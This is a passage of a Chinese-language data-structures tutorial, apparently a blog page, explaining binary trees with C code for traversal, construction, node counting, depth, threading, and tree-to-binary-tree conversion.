href="#满二叉树"></a> 满二叉树</h4><h5 id="定义-11"><a class="markdownIt-Anchor" href="#定义-11"></a> 定义</h5><p>在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层上，这样的二叉树称为满二</p><p>叉树；</p><h5 id="特点-3"><a class="markdownIt-Anchor" href="#特点-3"></a> 特点</h5><p>满二叉树很符合强迫症患者，其特点有：</p><p>1、叶子只能出现在最下一层，出现在其它层就不可能达成平衡 ；</p><p>2、非叶子结点的度一定是2，否则就是“缺胳膊少腿”了；</p><p>3、在同样的深度的二叉树中，满二叉树的结点个数最多，叶子数最多；</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%BB%A1%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="满二叉树"></p><h4 id="完全二叉树"><a class="markdownIt-Anchor" href="#完全二叉树"></a> 完全二叉树</h4><h5 id="定义-12"><a class="markdownIt-Anchor" href="#定义-12"></a> 定义</h5><p>对一棵具有n个结点的二叉树按层序编号，如果编号为i（1≤i≤n）的结点与同样深度的满二叉树中编号为i的结点在</p><p>二叉树中位置完全相同，则这课二叉树称为完全二叉树；</p><h5 id="特点-4"><a class="markdownIt-Anchor" href="#特点-4"></a> 特点</h5><p>1、叶子结点只能出现在最下两层；</p><p>2、最下面的叶子一定集中在左部连续位置；</p><p>3、倒数二层，若有叶子结点，一定都在右部连续位置；</p><p>4、如果结点度为1，则该结点只有左孩子，即不存在只有右孩子的情况；</p><p>5、同样结点数的二叉树，完全二叉树的深度最小；</p><p>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="完全二叉树"></p><p>// 判断某二叉树是否为完全二叉树：给每个结点按照满二叉树的结构逐层顺序编号，如果编号出现空档，就说明不</p><p>是完全二叉树，否则就是；</p><h3 id="二叉树的存储结构"><a class="markdownIt-Anchor" href="#二叉树的存储结构"></a> 二叉树的存储结构</h3><h4 id="二叉树的顺序存储结构"><a class="markdownIt-Anchor" href="#二叉树的顺序存储结构"></a> 二叉树的顺序存储结构</h4><p>二叉树的顺存储结构就是用一位数组存储二叉树中的结点，并且结点的存储位置，也就是数组的下标要能体现结点</p><p>之间的逻辑关系；编号过程：首先，把树的根节点的编号定为1，然后按照层次从上到下，从左到右的顺序对每一</p><p>结点进行编号，当一个结点的双亲结点的编号为i时，若它是左孩子，则编号为2i，若它是右孩子，则编号为2i+1;</p><p>但是这种存储结构会浪费大量的空间，一般适用于完全二叉树；</p><h4 id="二叉树的链式存储结构"><a class="markdownIt-Anchor" href="#二叉树的链式存储结构"></a> 二叉树的链式存储结构</h4><h5 id="二叉链表"><a class="markdownIt-Anchor" href="#二叉链表"></a> 二叉链表</h5><p>二叉树的每个结点最多有两个孩子，所以为它设计一个数据域和两个指针域，我们称这样的链表叫做二叉链表；</p><h5 id="抽象数据类型"><a class="markdownIt-Anchor" href="#抽象数据类型"></a> 抽象数据类型</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、InitTree(*T) <span class="comment">//构造空树T</span></span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>、DestroyTree(*T) <span class="comment">//销毁树T</span></span><br><span class="line">    </span><br><span class="line"><span class="number">3</span>、CreateTree(*T,definition) <span class="comment">//按definition中给出树的定义来构造树</span></span><br><span class="line">    </span><br><span class="line"><span class="number">4</span>、ClearTree(*T) <span class="comment">//若树T存在，则将树T清空为空树</span></span><br><span class="line">    </span><br><span class="line"><span class="number">5</span>、TreeEmpty(T) <span class="comment">//若树为空树，返回true，否则返回false</span></span><br><span class="line">    </span><br><span class="line"><span class="number">6</span>、TreeDepth(T) <span class="comment">//返回T的深度</span></span><br><span class="line">    </span><br><span class="line"><span class="number">7</span>、Root(T) <span class="comment">//返回T的根节点</span></span><br><span class="line">    </span><br><span class="line"><span class="number">8</span>、Value(T,cur_e) <span class="comment">//cur_e是树T中一个结点，返回此结点的值</span></span><br><span class="line">    </span><br><span class="line"><span class="number">9</span>、Assign(T,cur_e,value) <span class="comment">//给树T的结点cur_e赋值为value</span></span><br><span class="line">    </span><br><span class="line"><span class="number">10</span>、Parent(T,cur_e) <span class="comment">//若cur_e是树T的非根结点，则返回它的双亲，否则返回空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">11</span>、LsftChild(T,cur_e) <span class="comment">//若cur_e是树T的非叶结点，则返回它的最左孩子，否则返回空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">12</span>、RightSibling(T,cur_e) <span class="comment">//若cur_e有右兄弟，则返回它的右兄弟，否则返回空</span></span><br><span class="line">    </span><br><span class="line"><span class="number">13</span>、InsertChild(*T,*p,i,c) <span class="comment">//其中p指向树T的某个结点，i为所指结点p的度加上1，非空树c与T不相交，操作结果为输入c为树T中p指结点的第i棵子树</span></span><br><span class="line">    </span><br><span class="line"><span class="number">14</span>、DeleteChild(*T,*p,i) <span class="comment">//其中p指向树T的某个结点，i为所指结点p的度，操作结果为删除T中p所指结点的第i棵子树</span></span><br></pre></td></tr></tbody></table></figure><h5 id="存储结构-2"><a class="markdownIt-Anchor" href="#存储结构-2"></a> 存储结构</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BTNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span></span><br><span class="line">}BTNode,*BTree;</span><br></pre></td></tr></tbody></table></figure><h3 id="二叉树的遍历"><a class="markdownIt-Anchor" href="#二叉树的遍历"></a> 二叉树的遍历</h3><h4 id="定义-13"><a class="markdownIt-Anchor" href="#定义-13"></a> 定义</h4><p><strong>二叉树的遍历（traversing binary tree）是指从根结点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点被访问一次且仅被访问一次；</strong></p><p>以这棵树为例：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E9%81%8D%E5%8E%86%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="遍历二叉树"></p><h4 id="前序遍历dlr"><a class="markdownIt-Anchor" href="#前序遍历dlr"></a> 前序遍历（DLR）</h4><h5 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、访问根结点</strong></p><p><strong>2、先序遍历根结点的左子树</strong></p><p><strong>3、先序遍历根结点的右子树</strong></p><h5 id="算法"><a class="markdownIt-Anchor" href="#算法"></a> 算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//前序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, T-&gt;data); <span class="comment">//显示结点数据</span></span><br><span class="line">PreOrderTraverse(T-&gt;lchild); <span class="comment">//先序遍历左子树</span></span><br><span class="line">PreOrderTraverse(T-&gt;rchild); <span class="comment">//先序遍历右子树</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出"><a class="markdownIt-Anchor" href="#输出"></a> 输出</h5><p>先序遍历输出为：<code>ABDGHCEIF</code></p><h4 id="中序遍历ldr"><a class="markdownIt-Anchor" href="#中序遍历ldr"></a> 中序遍历（LDR）</h4><h5 id="操作-2"><a class="markdownIt-Anchor" href="#操作-2"></a> 操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、中序遍历根结点的左子树</strong></p><p><strong>2、访问根结点</strong></p><p><strong>3、中序遍历根结点的右子树</strong></p><h5 id="算法-2"><a class="markdownIt-Anchor" href="#算法-2"></a> 算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//中序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">InOrderTraverse(T-&gt;lchild); <span class="comment">//中序遍历左子树</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, T-&gt;data); <span class="comment">//显示结点数据</span></span><br><span class="line">InOrderTraverse(T-&gt;rchild); <span class="comment">//中序遍历右子树</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出-2"><a class="markdownIt-Anchor" href="#输出-2"></a> 输出</h5><p>中序遍历输出为：<code>BGDHAEICF</code></p><h4 id="后序遍历lrd"><a class="markdownIt-Anchor" href="#后序遍历lrd"></a> 后序遍历（LRD）</h4><h5 id="操作-3"><a class="markdownIt-Anchor" href="#操作-3"></a> 操作</h5><p><strong>若二叉树为空，遍历结束，否则依次执行以下操作：</strong></p><p><strong>1、后序遍历根结点的左子树</strong></p><p><strong>2、后序遍历根结点的右子树</strong></p><p><strong>3、访问根结点</strong></p><h5 id="算法-3"><a class="markdownIt-Anchor" href="#算法-3"></a> 算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//后序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">PostOrderTraverse(T-&gt;lchild); <span class="comment">//后序遍历左子树</span></span><br><span class="line">PostOrderTraverse(T-&gt;rchild); <span class="comment">//后序遍历右子树</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, T-&gt;data); <span class="comment">//显示结点数据</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出-3"><a class="markdownIt-Anchor" href="#输出-3"></a> 输出</h5><p>后序遍历输出为：<code>GHDBIEFCA</code></p><h4 id="层序遍历"><a class="markdownIt-Anchor" href="#层序遍历"></a> 层序遍历</h4><h5 id="操作-4"><a class="markdownIt-Anchor" href="#操作-4"></a> 操作</h5><p><strong>若二叉树为空，遍历结束，否则从树的第一层，也就是根结点开始访问，从上而下逐层遍历，在同一层中，按从左到右的顺序对结点逐个访问；</strong></p><h5 id="算法-4"><a class="markdownIt-Anchor" href="#算法-4"></a> 算法</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LevelOrderTraverse</span><span class="params">(BTree T)</span> <span class="comment">//层序遍历</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span> front, rear; <span class="comment">//定义队头队尾指针</span></span><br><span class="line">BTree p, q[MAX]; <span class="comment">//定义循环队列，存放结点指针</span></span><br><span class="line">p = T;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>) <span class="comment">//若二叉树为空，则根结点地址入队</span></span><br><span class="line">{</span><br><span class="line">front = <span class="number">1</span>;</span><br><span class="line">q[front] = p;</span><br><span class="line">rear = <span class="number">2</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">while</span> (front != rear) <span class="comment">//队列不为空</span></span><br><span class="line">{</span><br><span class="line">p = q[front];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data); <span class="comment">//访问队首结点的数据域</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>) <span class="comment">//将队首结点的左孩子入列</span></span><br><span class="line">{</span><br><span class="line">q[rear] = p-&gt;lchild;</span><br><span class="line">rear = (rear + <span class="number">1</span>) % MAX;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>) <span class="comment">//将队首结点的右孩子入列</span></span><br><span class="line">{</span><br><span class="line">q[rear] = p-&gt;rchild;</span><br><span class="line">rear = (rear + <span class="number">1</span>) % MAX;</span><br><span class="line">}</span><br><span class="line">front = (front + <span class="number">1</span>) % MAX;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="输出-4"><a class="markdownIt-Anchor" href="#输出-4"></a> 输出</h5><p>层序遍历的输出为：<code>ABCDEFGHI</code></p><h3 id="二叉树的建立"><a class="markdownIt-Anchor" href="#二叉树的建立"></a> 二叉树的建立</h3><h4 id="特殊处理"><a class="markdownIt-Anchor" href="#特殊处理"></a> 特殊处理</h4><p>为了让树的每个结点确认是否有左右孩子，我们对它进行了扩展，将空结点赋值 “#” ，我们成这种处理后的二叉树为原二叉树的扩展二叉树，所以就会得到类似于“AB##C#D###”的序列；</p><p>算法</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateBTree</span><span class="params">(BTree* T)</span> <span class="comment">//建立二叉树</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">DataType ch;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;ch);</span><br><span class="line"><span class="keyword">if</span> (ch == <span class="string">'#'</span>)</span><br><span class="line">{</span><br><span class="line">*T = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">*T = (BTree)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BTNode));</span><br><span class="line"><span class="keyword">if</span> (!*T)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line">(*T)-&gt;data = ch; <span class="comment">//生成根结点</span></span><br><span class="line">CreateBTree(&amp;(*T)-&gt;lchild); <span class="comment">//构造左子树</span></span><br><span class="line">CreateBTree(&amp;(*T)-&gt;rchild); <span class="comment">//构造右子树</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="统计二叉树叶子结点的数目"><a class="markdownIt-Anchor" href="#统计二叉树叶子结点的数目"></a> 统计二叉树叶子结点的数目</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Leafnodenum</span><span class="params">(BTree T)</span> <span class="comment">//统计二叉树叶子结点的数目</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (T-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; T-&gt;rchild == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line">count1++; <span class="comment">//全局变量计数，初始化为0</span></span><br><span class="line">}</span><br><span class="line">Leafnodenum(T-&gt;lchild); <span class="comment">//递归统计左子树叶子结点的数量</span></span><br><span class="line">Leafnodenum(T-&gt;rchild); <span class="comment">//递归统计右子树叶子结点的数量</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="统计二叉树结点总数"><a class="markdownIt-Anchor" href="#统计二叉树结点总数"></a> 统计二叉树结点总数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Nodetotalnum</span><span class="params">(BTree T)</span> <span class="comment">//统计二叉树结点总数</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (T)</span><br><span class="line">{</span><br><span class="line">count2++; <span class="comment">//全局变量计数，初始化为0</span></span><br><span class="line">Nodetotalnum(T-&gt;lchild); <span class="comment">//递归统计左子树结点数</span></span><br><span class="line">Nodetotalnum(T-&gt;rchild); <span class="comment">//递归统计右子树结点数</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="求二叉树的深度"><a class="markdownIt-Anchor" href="#求二叉树的深度"></a> 求二叉树的深度</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TreeDepth</span><span class="params">(BTree T)</span> <span class="comment">//求二叉树的深度</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">int</span>  ldep, rdep; <span class="comment">//定义两个整型变量，用以存放左、右子树的深度</span></span><br><span class="line"><span class="keyword">if</span> (T == <span class="literal">NULL</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">ldep = TreeDepth(T-&gt;lchild); <span class="comment">//递归统计左子树深度</span></span><br><span class="line">rdep = TreeDepth(T-&gt;rchild); <span class="comment">//递归统计右子树深度</span></span><br><span class="line"><span class="keyword">if</span> (ldep &gt; rdep)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> ldep + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> rdep + <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="线索二叉树"><a class="markdownIt-Anchor" href="#线索二叉树"></a> 线索二叉树</h2><h3 id="引言"><a class="markdownIt-Anchor" href="#引言"></a> 引言</h3><p><strong>对于一个有n个结点的二叉链表，每个结点有指向左右孩子的两个指针域，所以一共是2n个指针域，而n个结点的</strong></p><p><strong>二叉树一共有n-1条分支线数，也就是说，其实是存在2n-(n-1) = n+1个空指针域，这些空间不存储任何事物，白</strong></p><p><strong>白地浪费内存资源；因此，提出一种方法，利用原来的空指针域存放指针，指向树中其他结点；</strong></p><h3 id="定义-14"><a class="markdownIt-Anchor" href="#定义-14"></a> 定义</h3><p><strong>二叉树中所有空指针域的lchild，改为指向当前结点的前驱，把空指针域中的rchild，改为指向结点的后继；</strong></p><p><strong>我们把指向前驱和后继的指针叫做线索 ，加上线索的二叉树就称之为线索二叉树。</strong></p><h3 id="线索化"><a class="markdownIt-Anchor" href="#线索化"></a> 线索化</h3><p><strong>我们对二叉树以某种次序遍历使其变为线索二叉树的过程称作是线索化；</strong></p><h3 id="存储结构-3"><a class="markdownIt-Anchor" href="#存储结构-3"></a> 存储结构</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span>  <span class="comment">//这个是一个枚举类型</span></span><br><span class="line">{</span><br><span class="line">Link,Thread <span class="comment">//Link=0表示指向左右孩子指针，Thread表示指向前驱或后继的线索</span></span><br><span class="line">}PointerTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BThrTreeNode</span> //二叉线索存储结点结构</span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">DataType data; <span class="comment">//结点数据</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BThrTreeNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span> <span class="comment">//左右孩子指针</span></span><br><span class="line">PointerTag L_Tag; <span class="comment">//左右标志</span></span><br><span class="line">PointerTag R_Tag; <span class="comment">//左右标志</span></span><br><span class="line">}BThrTreeNode, * BThrTree;</span><br></pre></td></tr></tbody></table></figure><p>所以线索化的过程就是在遍历的过程中修改空指针的过程=_=</p><h3 id="中序遍历线索化"><a class="markdownIt-Anchor" href="#中序遍历线索化"></a> 中序遍历线索化</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">BThrTree pre; <span class="comment">//全局变量，始终指向刚刚访问过的结点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InThreading</span><span class="params">(BThrTree p)</span> <span class="comment">//中序遍历进行中序线索化</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="keyword">if</span> (p)</span><br><span class="line">{</span><br><span class="line">InThreading(p-&gt;lchild); <span class="comment">//递归左子树线索化</span></span><br><span class="line"><span class="keyword">if</span> (!p-&gt;lchild) <span class="comment">//没有左孩子</span></span><br><span class="line">{</span><br><span class="line">p-&gt;L_Tag = Thread; <span class="comment">//前驱线索</span></span><br><span class="line">p-&gt;lchild = pre; <span class="comment">//左孩子指针指向前驱</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (!pre-&gt;rchild) <span class="comment">//前驱没有右孩子</span></span><br><span class="line">{</span><br><span class="line">pre-&gt;R_Tag = Thread; <span class="comment">//后继线索</span></span><br><span class="line">pre-&gt;rchild = p; <span class="comment">//前驱右孩子指针指向后继（当前结点p）</span></span><br><span class="line">}</span><br><span class="line">pre = p; <span class="comment">//保持pre指向p的前驱</span></span><br><span class="line">InThreading(p-&gt;rchild); <span class="comment">//递归右子树线索化</span></span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="中序遍历线索二叉树"><a class="markdownIt-Anchor" href="#中序遍历线索二叉树"></a> 中序遍历线索二叉树</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//T指向头结点，头结点左链lchild指向根结点，头结点右链rchild指向中序遍历的最后一个结点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InOrderTraverse_Thr</span><span class="params">(BThrTree T)</span> <span class="comment">//中序遍历二叉线索链表表示的二叉树</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">BThrTree p;</span><br><span class="line">p = T-&gt;lchild; <span class="comment">//p指向根结点</span></span><br><span class="line"><span class="keyword">while</span> (p != T) <span class="comment">//空树或者遍历结束时，p==T</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">while</span> (p-&gt;L_Tag == Link) <span class="comment">//当L_Tag==0时循环到中序序列第一个结点</span></span><br><span class="line">{</span><br><span class="line">p = p-&gt;lchild;</span><br><span class="line">}</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data); <span class="comment">//显示结点数据，可以更改为其他对结点操作</span></span><br><span class="line"><span class="keyword">while</span> (p-&gt;R_Tag == Thread &amp;&amp; p-&gt;rchild != T)</span><br><span class="line">{</span><br><span class="line">p = p-&gt;rchild;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, p-&gt;data);</span><br><span class="line">}</span><br><span class="line">p = p-&gt;rchild; <span class="comment">//p进至其右子树根</span></span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="树-森林与二叉树的转换"><a class="markdownIt-Anchor" href="#树-森林与二叉树的转换"></a> 树、森林与二叉树的转换</h2><p>前面已经见过树的定义和存储结构，对于树来讲，可以是任意形状，一个结点可以有很多孩子，复杂很多，于是引</p><p>入了二叉树，这个就方便很多了；二叉树只有左右两个孩子，这样的话，面对的变化就少了，如果所有的树都能变</p><p>成二叉树就好了😅别说，还真可以：</p><h3 id="树转换为二叉树"><a class="markdownIt-Anchor" href="#树转换为二叉树"></a> 树转换为二叉树</h3><p>一般来讲，树转换为二叉树有以下几步：</p><p>1、加线：在所有兄弟结点之间加一条线；</p><p>2、去线：对树中的每个结点，只保留它与第一个孩子结点之间的连线，删除它与其他孩子结点之间的连线；</p><p>3、旋转：以树的根节点为轴心，将整棵树顺时针旋转45°，使之成为二叉树；</p><p><strong>如图所示：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%A0%91%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="树转换为二叉树"></p><h3 id="森林转换为二叉树"><a class="markdownIt-Anchor" href="#森林转换为二叉树"></a> 森林转换为二叉树</h3><p>森林是由若干棵树组成的，所以完全可以理解为，森林中的每一棵树都是兄弟，可以按照兄弟的处理办法来操作，方法如下：</p><p>1、把每棵树转换成二叉树；</p><p>2、第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵树的根结点的右孩子，用</p><p>线连接起来，当所有的二叉树连接起来后就得到了由森林转换来的二叉树；</p><p><strong>如图所示：</strong></p><p><img 